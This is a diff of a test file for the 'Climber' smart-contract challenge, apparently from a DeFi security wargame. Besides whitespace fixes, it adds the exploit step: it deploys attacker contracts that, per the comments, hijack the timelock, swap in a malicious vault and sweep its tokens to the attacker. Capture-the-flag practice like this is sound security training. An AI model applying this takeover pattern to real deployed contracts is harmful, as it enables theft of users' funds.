@@ -18,12 +18,12 @@ describe('[Challenge] Climber', function () {
         expect(
             await ethers.provider.getBalance(attacker.address)
         ).to.equal(ethers.utils.parseEther('0.1'));
-        
+
         // Deploy the vault behind a proxy using the UUPS pattern,
         // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
         this.vault = await upgrades.deployProxy(
             await ethers.getContractFactory('ClimberVault', deployer),
-            [ deployer.address, proposer.address, sweeper.address ],
+            [deployer.address, proposer.address, sweeper.address],
             { kind: 'uups' }
         );
 
@@ -31,13 +31,13 @@ describe('[Challenge] Climber', function () {
         expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
         expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
         expect(await this.vault.owner()).to.not.eq(deployer.address);
-        
+
         // Instantiate timelock
         let timelockAddress = await this.vault.owner();
         this.timelock = await (
             await ethers.getContractFactory('ClimberTimelock', deployer)
         ).attach(timelockAddress);
-        
+
         // Ensure timelock roles are correctly initialized
         expect(
             await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
@@ -51,8 +51,32 @@ describe('[Challenge] Climber', function () {
         await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
     });
 
-    it('Exploit', async function () {        
+    it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        //original contracts
+        const attackTimelock = this.timelock.connect(attacker);
+        const attackVault = this.vault.connect(attacker);
+
+        // Deploy our attack contracts
+        /// New Vault
+        const AttackVault = await ethers.getContractFactory('AttackVault', attacker);
+        const attackNewVault = await AttackVault.deploy();
+
+        /// Attack Contract
+        const AttackClimberTimelock = await ethers.getContractFactory("AttackClimberTimelock", attacker);
+        //arg: timelock, original vault, new vault, attacker address, DVT address
+        const attackTimelockContract = await AttackClimberTimelock.deploy(
+            attackTimelock.address,
+            attackVault.address,
+            attackNewVault.address,
+            attacker.address,
+            this.token.address
+        );
+
+        //Attack: call execute with our 4 call, sweep the funds, and send them our way
+        await attackTimelockContract.attack();
+
     });
 
     after(async function () {
